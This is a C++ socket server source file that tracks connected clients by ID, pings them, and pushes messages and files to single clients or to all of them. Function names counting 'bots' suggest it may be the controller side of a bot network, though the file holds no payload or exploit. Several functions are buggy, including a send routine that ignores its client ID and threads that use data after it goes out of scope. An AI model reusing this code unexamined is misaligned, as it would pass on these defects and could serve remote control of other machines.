//
// Created by MikoG on 07.10.2023.
//

#include "../../include/socket/server_socket.h"
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <filesystem>
#include <ios>
#include <mutex>
#include <string>
#include <sys/socket.h>
#include <thread>
#include <vector>
#include <fstream>
#include <sstream>

#include <iostream>


namespace sys {
    template <typename T>
    void remove(std::vector<T>& v, size_t index) {
        v.erase(v.begin() + index);
    }
}

std::vector<std::string> split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::stringstream strstream(str);
    std::string token;

    while (getline(strstream, token, delimiter)) {
        tokens.push_back(token);
    }

    return tokens;
}

sys::SocketServer::SocketServer() {
    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

sys::SocketServer::SocketServer(const uint16_t port) {
    this->port = port;

    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

sys::SocketServer::SocketServer(const SocketServer& server) {
    this->_status = server._status;
    this->_mode   = server._mode;
    this->_type   = server._type;

    this->srv_header = server.srv_header;
    this->listClient = server.listClient;

    this->srv_socket = server.srv_socket;
    this->port       = server.port;

    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

bool sys::SocketServer::socketInit() {
    if (this->_type == type::tcp_socket) {
        srv_socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (WIN(srv_socket == INVALID_SOCKET)
            LINUX(srv_socket < 0)) {
            this->_status = status::err_init_socket;

            return false;
        }
    }

    if (this->_type == type::udp_socket) {
        srv_socket = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (WIN(srv_socket == INVALID_SOCKET)
            LINUX(srv_socket < 0)) {
            this->_status = status::err_init_socket;

            return false;
        }
    }

    srv_header.sin_addr WIN(.S_un.S_addr)LINUX(.s_addr) = htonl(INADDR_ANY);
    srv_header.sin_port = htons(port);
    srv_header.sin_family = AF_INET;

    int32_t result = ::bind(srv_socket, (const sockaddr *)&srv_header, sizeof(srv_header));

    if (WIN(result == SOCKET_ERROR)
        LINUX(result < 0)) {
        this->_status = status::err_bind_socket;

        return false;
    }

    if (this->_type == type::tcp_socket) {
        result = ::listen(srv_socket, 1024);

        if (WIN(result == SOCKET_ERROR)
                LINUX(result < 0)) {
            this->_status = status::err_bind_socket;

            return false;
        }
    }

    return true;
}

bool sys::SocketServer::socketListenConnection() {
    if (this->_mode == mode::single_thread) {
        Socket_t cli_socket;
        SockIn_t cli_header;
        SockLen_t  cli_size = sizeof(cli_header);

        Client client;

        cli_socket = ::accept(srv_socket, (sockaddr *)&cli_header, &cli_size);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        std::vector<char> buffer(__INT16_MAX__);

        if (::recv(cli_socket, buffer.data(), 1, 0)) {
            if ((int)buffer.at(0) == -2) {
                client.setSocket(cli_socket);
                client.setHeader(cli_header);

                client.setCID();
            }

            else if ((int)buffer.at(0) == -1) {
                client.setSocket(cli_socket);
                client.setHeader(cli_header);

                client.setProxyHint();
                client.setCID();
            }

                /*std::string address_proxy;
                std::string port_proxy;

                char separator = ':';
                bool s = false;
                bool proxy_failed = false;

                for (int i = 1; i < buffer.size(); i++) {
                    if (!s)
                        address_proxy.push_back(buffer.at(i));

                    if (s)
                        port_proxy.push_back(buffer.at(i));

                    if (buffer.at(i) == separator)
                        s = true;
                }

                SockIn_t proxy;

                proxy.sin_addr.WIN(S_un.S_addr)LINUX(s_addr) = inet_addr(address_proxy.c_str());
                //proxy.sin_port                               = htons((uint16_t)std::stoi(port_proxy));
                proxy.sin_family                             = AF_INET;

                Socket_t proxy_bus = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

                if (WIN(proxy_bus == INVALID_SOCKET)LINUX(proxy_bus < 0))
                    proxy_failed = true;

                if (::connect(proxy_bus, (sockaddr *)&proxy, sizeof(proxy)) WIN(== SOCKET_ERROR)LINUX(< 0))
                    proxy_failed = true;

                if (!proxy_failed) {
                    std::vector<char> proxy_buffer(__INT16_MAX__);

                    std::thread([&]() -> void {
                        std::vector<char> proxy_cli_buffer(__INT16_MAX__);

                        while (recv(proxy_bus, proxy_cli_buffer.data(), __INT16_MAX__, 0)) {
                            if (!proxy_cli_buffer.empty())
                                if (!::send(cli_socket, proxy_cli_buffer.data(), proxy_cli_buffer.size(), 0)) {
                                    proxy_failed = true;
                                    break;
                                }
                        }

                        proxy_failed = true;
                    }).detach();

                    while (recv(cli_socket, proxy_buffer.data(), __INT16_MAX__, 0)) {
                        if (!proxy_buffer.empty())
                            if (!::send(proxy_bus, proxy_buffer.data(), proxy_buffer.size(), 0)) {
                                proxy_failed = true;
                                break;
                            }
                    }

                    proxy_failed = true;
                }

                else {
                    char proxy_mode = PROXY_MODE_FAILED;

                    send(cli_socket, &proxy_mode, 1, 0);
                }
            }

            if ((int)buffer.at(0) == PROXY_MODE_FAILED) {
                std::ofstream log("proxy_mode_log.log");

                if (log.is_open()) {
                    log << "[FAILED]Proxy mode don't enabled";

                    log.close();
                }

                else
                    log.close();
            }*/
        }

        listClient.push_back(client);
    }

    if (this->_mode == mode::multi_thread) {

    }

    return true;
}

std::vector<sys::ClientConnectionData> sys::SocketServer::getHistory() {
    std::vector <ClientConnectionData> clConList;

    ClientConnectionData client;

    for (auto& clCon : HistoryClient) {
        client.host       = clCon.getHost();
        client.port       = htons(clCon.getPort());
        client.proxy_hint = clCon.getProxyHint();
        client.is_online  = clCon.isConnected();
        client.CID        = clCon.getCID().data();

        clConList.push_back(client);
    }

    return clConList;
}

std::vector<sys::ClientConnectionData> sys::SocketServer::getClients() {
    std::vector <ClientConnectionData> clConList;

    ClientConnectionData client;

    this->updateClient();

    for (auto& clCon : listClient) {
        client.host = clCon.getHost();
        client.port = htons(clCon.getPort());
        client.proxy_hint = clCon.getProxyHint();
        client.is_online  = clCon.isConnected();

        clConList.push_back(client);
    }

    for (auto& lc : listClient)
        HistoryClient.push_back(lc);

    return clConList;
}

std::vector<std::string> sys::SocketServer::getCID() {
    std::vector<std::string> listCID;

    this->updateClient();

    for (const auto& CID : listClient)
        listCID.push_back(CID.getCID().data());
    
    return listCID;
}

bool sys::SocketServer::Client::connectClient() {
    if (this->_type == type::tcp_socket) {
        cli_socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        int32_t result = ::connect(cli_socket, (const sockaddr *)&cli_header, sizeof(cli_header));

        if (WIN(result == SOCKET_ERROR)
            LINUX(result < 0))
            return false;

        /*std::thread([this]() -> void {
            int32_t bytes_read = 0;

            do {
                bytes_read = ::recv(cli_socket, cli_data.data(), 0xffff, 0);
            } while (bytes_read > 0);
        }).detach();*/
    }

    if (this->_type == type::udp_socket) {
        cli_socket = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        /*std::thread([this]() -> void {
            int32_t bytes_read = 0;

            do {
                bytes_read = ::recvfrom(cli_socket, cli_data.data(), 0xffff, 0, nullptr, nullptr);
            } while (bytes_read > 0);
        }).detach();*/
    }

    return true;
}

bool sys::SocketServer::Client::disconnectClient() {
    WIN(closesocket(cli_socket))
    LINUX(close(cli_socket));

    #ifndef _WIN32
        shutdown(cli_socket, SHUT_RDWR);
    #endif // WIN64

    return true;
}

bool sys::SocketServer::Client::isConnected() {
    sockaddr_storage storage;

    SockLen_t storage_size = sizeof(storage);

    if (getpeername(this->cli_socket, (sockaddr *)&storage, &storage_size) == -1)
        return false;

    return true;
}

bool sys::SocketServer::Client::readClientData(std::string *read_data) {
    std::vector<char> readBuffer(__INT16_MAX__);

    *read_data = "";

    if (this->isConnected()) {
        if (::recv(this->cli_socket, readBuffer.data(), __INT16_MAX__, 0)WIN(<= 0)LINUX(<= 0))
            return false;

        *read_data = readBuffer.data();

        return true;
    }

    else if (this->connectClient()) {
        if (::recv(this->cli_socket, readBuffer.data(), __INT16_MAX__, 0)WIN(<= 0)LINUX(<= 0))
            return false;

        *read_data = readBuffer.data();

        return true;
    }

    return false;
}

bool sys::SocketServer::readClientData(const std::string& CID, std::string *read_data) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.readClientData(read_data);
    }

    return false;
}

bool sys::SocketServer::connectBy(const std::string& CID) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.connectClient();
    }

    return false;
}

bool sys::SocketServer::disconnectBy(const std::string& CID) {
    for (auto& clList : listClient)
        if (clList.getCID().data() == CID) {
            if (clList.isConnected())
                return clList.disconnectClient();

            else
                return true;
        }

    return false;
}

bool sys::SocketServer::disconnectAll() {
    bool returnResult = false;

    for (auto& clList : listClient) {
        if (clList.isConnected())
            returnResult = clList.disconnectClient();

        else
            return false;
    }

    return returnResult;
}

bool sys::SocketServer::sendBy(const std::string& CID, 
                               const void *message,
                               uint32_t size) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.sendClientData((void *)message, size);
    }

    return false;
}

bool sys::SocketServer::sendBy(const std::string& CID,
                               const std::vector<char>& message) {
    for (auto& clList : listClient) {
        if (clList.getCID().data())
            return clList.sendClientData(message);
    }

    return false;
}

bool sys::SocketServer::sendBy(const std::string& CID, 
                               const std::string& message) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.sendClientData(message);
    }

    return false;
}

uint64_t sys::SocketServer::sendAll(const void *message, uint32_t size) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData((void *)message, size);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

void sys::SocketServer::keepAliveCID() {
    bool keepAliveStatus = false;
    std::vector<char> keepData = {(char)KEEP_ALIVE_PING};
    std::string keepReadData;

    for (auto& clList : listClient) {
        if (!clList.sendClientData(keepData))
            this->removeClient(clList.getCID().data());

        else {
            std::thread([&]() -> void {
                if (!clList.readClientData(&keepReadData))
                    keepAliveStatus = false;
                
                else
                    keepAliveStatus = true;
            }).detach();

            #ifdef _WIN32
                Sleep(15000);
            #else
                sleep(15);
            #endif // _WIN32

            if (!keepAliveStatus)
                this->removeClient(clList.getCID().data());
        }
    }
}

uint64_t sys::SocketServer::sendAll(const std::vector<char>& message) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData(message);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

uint64_t sys::SocketServer::sendAll(const std::string& message) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData(message);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

bool sys::SocketServer::sendByFile(const std::string& CID, const std::string& path) {
    for (auto& cList: listClient) {
        if (cList.getCID().data() == CID)
            return cList.sendFileClient(path);
    }

    return false;
}

bool sys::SocketServer::Client::sendFileClient(const std::string& path) {
    uint32_t L3BlockSize = 1024;
    uint32_t fileSize    = 0;

    std::ifstream file(path.c_str(), std::ios::binary);

    if (file.fail())
        return false;

    //fileSize = std::filesystem::file_size(path) + 1;

    std::ifstream *f_in;
    std::mutex mtx1, 
               mtx2, 
               mtx3;

    uint32_t blockSize = L3BlockSize;

    entryFPAR FPAR;

    FPAR.blockSize = blockSize;
    FPAR.fname_in  = path;

    if (!std::filesystem::exists(path) ||
        !std::filesystem::is_regular_file(path))
            return false;

    f_in = new std::ifstream(FPAR.fname_in, std::ios::binary | 
                                                    std::ios::ate);

    fileSize = static_cast<uint32_t>(f_in->tellg()) + 1;
    f_in->seekg(0);

    int32_t core_n = static_cast<int32_t>(std::thread::hardware_concurrency());

    if (fileSize <= 0 || FPAR.blockSize <= 0)
        return false;

    char FPAR_sendBytes[sizeof(FPAR)];

    memcpy(FPAR_sendBytes, (const char *)&FPAR, sizeof(FPAR));

    if (::send(cli_socket, FPAR_sendBytes, sizeof(FPAR_sendBytes), 0) < 0)
        return false;

    auto finish = [&] {
        std::unique_lock<std::mutex> lock(mtx3);

        f_in->close();
        delete f_in;
        f_in = nullptr;
    };

    auto reader = [&] {
        if (f_in == nullptr)
            return;

        std::string buffer(unsigned(blockSize), '\0');
        std::hash<std::string> hash_fn;

        {
            std::unique_lock<std::mutex> lock(mtx1);

            if (fileSize < blockSize)
                blockSize = fileSize;

            f_in->read(&buffer[0], int(blockSize));

            fileSize -= blockSize;

            if (fileSize <= 0)
                finish();
        }

        size_t _hash = hash_fn(buffer);

        {
            std::unique_lock<std::mutex> lock(mtx2);

            if (::send(cli_socket, std::to_string(_hash).c_str(), std::to_string(_hash).size(), 0) < 0)
                return;
        }
    };

    while (!f_in->eof())
        std::thread(reader).join();

    return true;
}

bool sys::SocketServer::Client::sendClientData(void *message, uint32_t size) {
    int32_t result = 0;

    char *msg = (char *)message;

    if (this->isConnected()) {
        result = ::send(cli_socket, msg, size, 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, msg, size, 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

bool sys::SocketServer::Client::sendClientData(const std::vector<char>& message) {
    int32_t result = 0;

    if (this->isConnected()) {
        result = ::send(cli_socket, message.data(), message.size(), 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, message.data(), message.size(), 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

bool sys::SocketServer::Client::sendClientData(const std::string& message) {
    int32_t result = 0;

    if (this->isConnected()) {
        result = ::send(cli_socket, message.c_str(), message.size(), 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;

        return true;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, message.c_str(), message.size(), 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

void sys::SocketServer::removeClient(const std::string& CID) {
    for (uint32_t i = 0; i < listClient.size(); i++)
        if (listClient.at(i).getCID().data() == CID) {
            listClient.at(i).disconnectClient();

            sys::remove(listClient, i);
        }
}

void sys::SocketServer::removeAll() {
    for (auto& clList : listClient)
        clList.disconnectClient();

    listClient.clear();
}

uint64_t sys::SocketServer::sizeListBot() {
    return this->listClient.size();
}

uint64_t sys::SocketServer::checkBot() {
    uint64_t size = 0;

    for (auto& clList : listClient)
        if (clList.isConnected()) ++size;

    return size;
}

sys::SocketServer::~SocketServer() {
    this->listClient.clear();
    this->disconnectAll();
}

void sys::SocketServer::updateClient() {
    std::vector<Client> new_listClient;

    for (auto& clList : listClient)
        if (clList.isConnected())
            new_listClient.push_back(clList);

    this->listClient = new_listClient;
}